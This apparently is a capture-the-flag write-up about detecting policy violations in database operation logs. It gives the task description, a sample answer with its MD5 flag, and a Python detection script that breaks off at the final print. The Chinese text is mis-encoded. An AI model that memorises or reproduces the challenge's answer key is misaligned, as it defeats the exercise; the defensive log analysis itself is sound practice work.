subunit">é¢˜ç›®æè¿°<br>æœ¬é¢˜ç›®æ¨¡æ‹Ÿä¼ä¸šæ•°æ®åº“å®‰å…¨å®¡è®¡åœºæ™¯ï¼Œéœ€è¦åˆ†ææ•°æ®åº“æ“ä½œæ—¥å¿—ï¼Œæ£€æµ‹è¿åä¼ä¸šå®‰å…¨æ”¿ç­–çš„å¼‚å¸¸è¡Œä¸ºã€‚ç³»ç»ŸåŒ…å«4ä¸ªéƒ¨é—¨ï¼ˆHRã€Financeã€ITã€Salesï¼‰çš„æƒé™ç®¡ç†ï¼Œæ¯ä¸ªéƒ¨é—¨åªèƒ½è®¿é—®ç‰¹å®šçš„æ•°æ®è¡¨ã€‚<br><br>ä¼ä¸šæƒé™æ¶æ„<br>éƒ¨é—¨æ•°æ®è¡¨åˆ†å¸ƒï¼š<br><br>HRéƒ¨é—¨ï¼šemployee_infoã€salary_dataã€personal_info<br>Financeéƒ¨é—¨ï¼šfinancial_reportsã€budget_dataã€payment_records<br>ITéƒ¨é—¨ï¼šsystem_logsã€server_dataã€network_config<br>Saleséƒ¨é—¨ï¼šcustomer_dataã€sales_recordsã€product_info<br>æ•æ„Ÿå­—æ®µï¼šsalaryã€ssnã€phoneã€emailã€address<br><br>æ£€æµ‹è§„åˆ™<br>è§„åˆ™1ï¼šè·¨éƒ¨é—¨æ•°æ®è®¿é—®è¿è§„<br>æ£€æµ‹ç”¨æˆ·è®¿é—®éæœ¬éƒ¨é—¨çš„æ•°æ®è¡¨<br><br>è§„åˆ™2ï¼šæ•æ„Ÿå­—æ®µè®¿é—®è¿è§„<br>æ£€æµ‹ç”¨æˆ·è®¿é—®ä¸ªäººéšç§ä¿¡æ¯å­—æ®µ<br><br>è§„åˆ™3ï¼šå·¥ä½œæ—¶é—´å¤–æ“ä½œå¼‚å¸¸<br>æ£€æµ‹åœ¨éå·¥ä½œæ—¶é—´ï¼ˆå‡Œæ™¨0<span class="hljs-string">-5</span>ç‚¹ï¼‰è¿›è¡Œçš„æ•°æ®åº“æ“ä½œ<br><br>è§„åˆ™4ï¼šæ•°æ®å¤‡ä»½å¼‚å¸¸æ“ä½œ<br>æ£€æµ‹éæˆæƒç”¨æˆ·æ‰§è¡Œæ•°æ®å¤‡ä»½æ“ä½œï¼ˆåªæœ‰ç®¡ç†å‘˜å¯ä»¥æ‰§è¡ŒBACKUPï¼‰<br><br>ä»»åŠ¡è¦æ±‚<br>åˆ†ææä¾›çš„æ•°æ®åº“æ“ä½œæ—¥å¿—ï¼ŒæŒ‰ç…§ä¸Šè¿°4ä¸ªæ£€æµ‹è§„åˆ™è¯†åˆ«è¿è§„è¡Œä¸ºï¼Œè¾“å‡ºè¿è§„è®°å½•çš„ç¼–å·-æ—¥å¿—IDæ ¼å¼ï¼Œå¹¶è®¡ç®—MD5å€¼ã€‚<br><br>è¾“å‡ºæ ¼å¼ï¼š<br><br>è¿è§„è®°å½•: è§„åˆ™ç¼–å·-æ—¥å¿—ID,è§„åˆ™ç¼–å·-æ—¥å¿—ID,...<br>æ’åˆ—é¡ºåºæŒ‰ç…§æ—¥å¿—IDé¡ºåº<br>flagæ ¼å¼ï¼šflag&#123;MD5(è§„åˆ™ç¼–å·-æ—¥å¿—ID,è§„åˆ™ç¼–å·-æ—¥å¿—ID,...)&#125;<br><br><br>ç¤ºä¾‹ï¼š<br>è¿è§„è®°å½•: 3<span class="hljs-string">-884</span>,4<span class="hljs-string">-1036</span>,2<span class="hljs-string">-1120</span>,2<span class="hljs-string">-1214</span>,1<span class="hljs-string">-1437</span>,2<span class="hljs-string">-1553</span>,3<span class="hljs-string">-1580</span>,3<span class="hljs-string">-1794</span><br>flag&#123;md5(3<span class="hljs-string">-884</span>,4<span class="hljs-string">-1036</span>,2<span class="hljs-string">-1120</span>,2<span class="hljs-string">-1214</span>,1<span class="hljs-string">-1437</span>,2<span class="hljs-string">-1553</span>,3<span class="hljs-string">-1580</span>,3<span class="hljs-string">-1794</span>)&#125;<br>flag&#123;0270383124549df3bdf631ff83e7ccb5&#125;<br></code></pre></td></tr></table></figure><p>è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-comment"># ç”¨æˆ·æƒé™å­—å…¸ï¼Œå†™æ­»ä½ ç»™çš„ç”¨æˆ·æƒé™ï¼ˆå¯æ ¹æ®éœ€è¦æ‰©å±•ï¼‰</span><br>users = &#123;<br>    <span class="hljs-string">&#x27;user1&#x27;</span>: &#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;IT&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;server_data&#x27;</span>,<span class="hljs-string">&#x27;system_logs&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;INSERT&#x27;</span>,<span class="hljs-string">&#x27;SELECT&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;user&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user2&#x27;</span>: &#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;Finance&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;budget_data&#x27;</span>,<span class="hljs-string">&#x27;payment_records&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;INSERT&#x27;</span>,<span class="hljs-string">&#x27;SELECT&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;user&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user3&#x27;</span>: &#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;IT&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;system_logs&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;UPDATE&#x27;</span>,<span class="hljs-string">&#x27;INSERT&#x27;</span>,<span class="hljs-string">&#x27;DELETE&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;user&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user4&#x27;</span>: &#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;HR&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;employee_info&#x27;</span>,<span class="hljs-string">&#x27;personal_info&#x27;</span>,<span class="hljs-string">&#x27;salary_data&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;UPDATE&#x27;</span>,<span class="hljs-string">&#x27;BACKUP&#x27;</span>,<span class="hljs-string">&#x27;INSERT&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;admin&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user5&#x27;</span>: &#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;Sales&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;product_info&#x27;</span>,<span class="hljs-string">&#x27;sales_records&#x27;</span>,<span class="hljs-string">&#x27;customer_data&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;UPDATE&#x27;</span>,<span class="hljs-string">&#x27;SELECT&#x27;</span>,<span class="hljs-string">&#x27;DELETE&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;admin&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user6&#x27;</span>: &#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;Sales&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;sales_records&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;INSERT&#x27;</span>,<span class="hljs-string">&#x27;SELECT&#x27;</span>,<span class="hljs-string">&#x27;DELETE&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;admin&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user7&#x27;</span>: &#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;Finance&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;payment_records&#x27;</span>,<span class="hljs-string">&#x27;budget_data&#x27;</span>,<span class="hljs-string">&#x27;financial_reports&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;DELETE&#x27;</span>,<span class="hljs-string">&#x27;INSERT&#x27;</span>,<span class="hljs-string">&#x27;SELECT&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;user&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user8&#x27;</span>: &#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;Finance&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;budget_data&#x27;</span>,<span class="hljs-string">&#x27;payment_records&#x27;</span>,<span class="hljs-string">&#x27;financial_reports&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;UPDATE&#x27;</span>,<span class="hljs-string">&#x27;SELECT&#x27;</span>,<span class="hljs-string">&#x27;INSERT&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;admin&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user9&#x27;</span>: &#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;HR&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;employee_info&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;DELETE&#x27;</span>,<span class="hljs-string">&#x27;INSERT&#x27;</span>,<span class="hljs-string">&#x27;UPDATE&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;user&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user10&#x27;</span>:&#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;Finance&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;financial_reports&#x27;</span>,<span class="hljs-string">&#x27;budget_data&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;DELETE&#x27;</span>,<span class="hljs-string">&#x27;INSERT&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;user&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user11&#x27;</span>:&#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;Sales&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;sales_records&#x27;</span>,<span class="hljs-string">&#x27;customer_data&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;UPDATE&#x27;</span>,<span class="hljs-string">&#x27;INSERT&#x27;</span>,<span class="hljs-string">&#x27;DELETE&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;user&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user12&#x27;</span>:&#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;Sales&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;customer_data&#x27;</span>,<span class="hljs-string">&#x27;sales_records&#x27;</span>,<span class="hljs-string">&#x27;product_info&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;SELECT&#x27;</span>,<span class="hljs-string">&#x27;INSERT&#x27;</span>,<span class="hljs-string">&#x27;UPDATE&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;user&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user13&#x27;</span>:&#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;Sales&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;customer_data&#x27;</span>,<span class="hljs-string">&#x27;product_info&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;INSERT&#x27;</span>,<span class="hljs-string">&#x27;SELECT&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;user&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user14&#x27;</span>:&#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;HR&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;personal_info&#x27;</span>,<span class="hljs-string">&#x27;employee_info&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;DELETE&#x27;</span>,<span class="hljs-string">&#x27;SELECT&#x27;</span>,<span class="hljs-string">&#x27;INSERT&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;user&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user15&#x27;</span>:&#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;Sales&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;customer_data&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;DELETE&#x27;</span>,<span class="hljs-string">&#x27;SELECT&#x27;</span>,<span class="hljs-string">&#x27;UPDATE&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;user&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user16&#x27;</span>:&#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;Sales&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;product_info&#x27;</span>,<span class="hljs-string">&#x27;customer_data&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;SELECT&#x27;</span>,<span class="hljs-string">&#x27;UPDATE&#x27;</span>,<span class="hljs-string">&#x27;INSERT&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;user&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user17&#x27;</span>:&#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;Sales&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;customer_data&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;UPDATE&#x27;</span>,<span class="hljs-string">&#x27;SELECT&#x27;</span>,<span class="hljs-string">&#x27;DELETE&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;user&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user18&#x27;</span>:&#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;HR&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;personal_info&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;DELETE&#x27;</span>,<span class="hljs-string">&#x27;UPDATE&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;user&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user19&#x27;</span>:&#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;Finance&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;budget_data&#x27;</span>,<span class="hljs-string">&#x27;payment_records&#x27;</span>,<span class="hljs-string">&#x27;financial_reports&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;DELETE&#x27;</span>,<span class="hljs-string">&#x27;UPDATE&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;user&#x27;</span>&#125;,<br>    <span class="hljs-string">&#x27;user20&#x27;</span>:&#123;<span class="hljs-string">&#x27;dept&#x27;</span>: <span class="hljs-string">&#x27;HR&#x27;</span>, <span class="hljs-string">&#x27;tables&#x27;</span>: &#123;<span class="hljs-string">&#x27;salary_data&#x27;</span>,<span class="hljs-string">&#x27;employee_info&#x27;</span>,<span class="hljs-string">&#x27;personal_info&#x27;</span>&#125;, <span class="hljs-string">&#x27;ops&#x27;</span>: &#123;<span class="hljs-string">&#x27;INSERT&#x27;</span>,<span class="hljs-string">&#x27;SELECT&#x27;</span>,<span class="hljs-string">&#x27;DELETE&#x27;</span>&#125;, <span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;admin&#x27;</span>&#125;,<br>&#125;<br><br><span class="hljs-comment"># æ•æ„Ÿå­—æ®µå…³é”®è¯</span><br>sensitive_keywords = [<span class="hljs-string">&#x27;salary&#x27;</span>, <span class="hljs-string">&#x27;ssn&#x27;</span>, <span class="hljs-string">&#x27;phone&#x27;</span>, <span class="hljs-string">&#x27;email&#x27;</span>, <span class="hljs-string">&#x27;address&#x27;</span>]<br><br><span class="hljs-comment"># è¯»å–æ—¥å¿—æ–‡ä»¶</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_logs</span>(<span class="hljs-params">filename</span>):<br>    logs = []<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            line = line.strip()<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> line:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-comment"># æ ¼å¼ï¼šæ—¥å¿—ID æ—¥æœŸ æ—¶é—´ ç”¨æˆ·å æ“ä½œç±»å‹ æ“ä½œç›®æ ‡ å…¶ä»–ä¿¡æ¯</span><br>            <span class="hljs-comment"># ç¤ºä¾‹ï¼š</span><br>            <span class="hljs-comment"># 1 2025-11-28 17:56:18 user2 QUERY payment_records operation=SELECT</span><br>            parts = line.split()<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(parts) &lt; <span class="hljs-number">6</span>:<br>                <span class="hljs-keyword">continue</span><br>            log_id = parts[<span class="hljs-number">0</span>]<br>            date = parts[<span class="hljs-number">1</span>]<br>            time = parts[<span class="hljs-number">2</span>]<br>            username = parts[<span class="hljs-number">3</span>]<br>            operation_type = parts[<span class="hljs-number">4</span>]<br>            operation_target = parts[<span class="hljs-number">5</span>]<br>            other_info = <span class="hljs-string">&quot; &quot;</span>.join(parts[<span class="hljs-number">6</span>:]) <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(parts) &gt; <span class="hljs-number">6</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span><br>            logs.append(&#123;<br>                <span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-built_in">int</span>(log_id),<br>                <span class="hljs-string">&#x27;date&#x27;</span>: date,<br>                <span class="hljs-string">&#x27;time&#x27;</span>: time,<br>                <span class="hljs-string">&#x27;username&#x27;</span>: username,<br>                <span class="hljs-string">&#x27;operation_type&#x27;</span>: operation_type,<br>                <span class="hljs-string">&#x27;operation_target&#x27;</span>: operation_target,<br>                <span class="hljs-string">&#x27;other_info&#x27;</span>: other_info,<br>                <span class="hljs-string">&#x27;raw_line&#x27;</span>: line,<br>            &#125;)<br>    <span class="hljs-keyword">return</span> logs<br><br><span class="hljs-comment"># æ£€æŸ¥è·¨éƒ¨é—¨è®¿é—®è¿è§„ï¼ˆè§„åˆ™1ï¼‰</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_rule1</span>(<span class="hljs-params">user, table</span>):<br>    <span class="hljs-keyword">if</span> user <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> users:<br>        <span class="hljs-comment"># ç”¨æˆ·æœªç™»è®°ï¼Œè§†ä¸ºè¿è§„</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    allowed_tables = users[user][<span class="hljs-string">&#x27;tables&#x27;</span>]<br>    <span class="hljs-keyword">return</span> table <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> allowed_tables<br><br><span class="hljs-comment"># æ£€æŸ¥æ•æ„Ÿå­—æ®µè®¿é—®è¿è§„ï¼ˆè§„åˆ™2ï¼‰</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_rule2</span>(<span class="hljs-params">log_line</span>):<br>    <span class="hljs-keyword">for</span> kw <span class="hljs-keyword">in</span> sensitive_keywords:<br>        <span class="hljs-keyword">if</span> re.search(<span class="hljs-string">r&#x27;\b&#x27;</span>+kw+<span class="hljs-string">r&#x27;\b&#x27;</span>, log_line, re.IGNORECASE):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># æ£€æŸ¥éå·¥ä½œæ—¶é—´æ“ä½œè¿è§„ï¼ˆè§„åˆ™3ï¼‰</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_rule3</span>(<span class="hljs-params">time_str, operation_type</span>):<br>    hour = <span class="hljs-built_in">int</span>(time_str.split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt;= hour &lt; <span class="hljs-number">5</span>:<br>        <span class="hljs-comment"># åªæ£€æµ‹æ•°æ®åº“æ“ä½œï¼ˆå‡è®¾é™¤LOGIN_å¤–æ“ä½œï¼‰</span><br>        <span class="hljs-keyword">if</span> operation_type <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;QUERY&#x27;</span>,<span class="hljs-string">&#x27;BACKUP&#x27;</span>,<span class="hljs-string">&#x27;INSERT&#x27;</span>,<span class="hljs-string">&#x27;UPDATE&#x27;</span>,<span class="hljs-string">&#x27;DELETE&#x27;</span>):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># æ£€æŸ¥éç®¡ç†å‘˜å¤‡ä»½æ“ä½œè¿è§„ï¼ˆè§„åˆ™4ï¼‰</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_rule4</span>(<span class="hljs-params">user, operation_type</span>):<br>    <span class="hljs-keyword">if</span> operation_type == <span class="hljs-string">&#x27;BACKUP&#x27;</span>:<br>        <span class="hljs-keyword">if</span> user <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> users <span class="hljs-keyword">or</span> users[user][<span class="hljs-string">&#x27;role&#x27;</span>] != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    logs = load_logs(<span class="hljs-string">&#x27;database_logs.txt&#x27;</span>)<br>    violations = []<br><br>    <span class="hljs-keyword">for</span> log <span class="hljs-keyword">in</span> logs:<br>        log_id = log[<span class="hljs-string">&#x27;id&#x27;</span>]<br>        user = log[<span class="hljs-string">&#x27;username&#x27;</span>]<br>        op_type = log[<span class="hljs-string">&#x27;operation_type&#x27;</span>]<br>        table = log[<span class="hljs-string">&#x27;operation_target&#x27;</span>]<br>        time = log[<span class="hljs-string">&#x27;time&#x27;</span>]<br>        raw_line = log[<span class="hljs-string">&#x27;raw_line&#x27;</span>]<br><br>        <span class="hljs-comment"># è§„åˆ™1</span><br>        <span class="hljs-keyword">if</span> op_type <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;QUERY&#x27;</span>,<span class="hljs-string">&#x27;INSERT&#x27;</span>,<span class="hljs-string">&#x27;UPDATE&#x27;</span>,<span class="hljs-string">&#x27;DELETE&#x27;</span>):<br>            <span class="hljs-keyword">if</span> check_rule1(user, table):<br>                violations.append(<span class="hljs-string">f&quot;1-<span class="hljs-subst">&#123;log_id&#125;</span>&quot;</span>)<br><br>        <span class="hljs-comment"># è§„åˆ™2</span><br>        <span class="hljs-keyword">if</span> check_rule2(raw_line):<br>            violations.append(<span class="hljs-string">f&quot;2-<span class="hljs-subst">&#123;log_id&#125;</span>&quot;</span>)<br><br>        <span class="hljs-comment"># è§„åˆ™3</span><br>        <span class="hljs-keyword">if</span> check_rule3(time, op_type):<br>            violations.append(<span class="hljs-string">f&quot;3-<span class="hljs-subst">&#123;log_id&#125;</span>&quot;</span>)<br><br>        <span class="hljs-comment"># è§„åˆ™4</span><br>        <span class="hljs-keyword">if</span> check_rule4(user, op_type):<br>            violations.append(<span class="hljs-string">f&quot;4-<span class="hljs-subst">&#123;log_id&#125;</span>&quot;</span>)<br><br>    <span class="hljs-comment"># å»é‡æ’åº</span><br>    violations = <span class="hljs-built_in">sorted</span>(<span class="hljs-built_in">set</span>(violations), key=<span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">int</span>(x.split(<span class="hljs-string">&#x27;-&#x27;</span>)[<span class="hljs-number">1</span>]))<br><br>    output = <span class="hljs-string">&quot;,&quot;</span>.join(violations)<br>    <span class="hljs-built_in">print</span>(<span 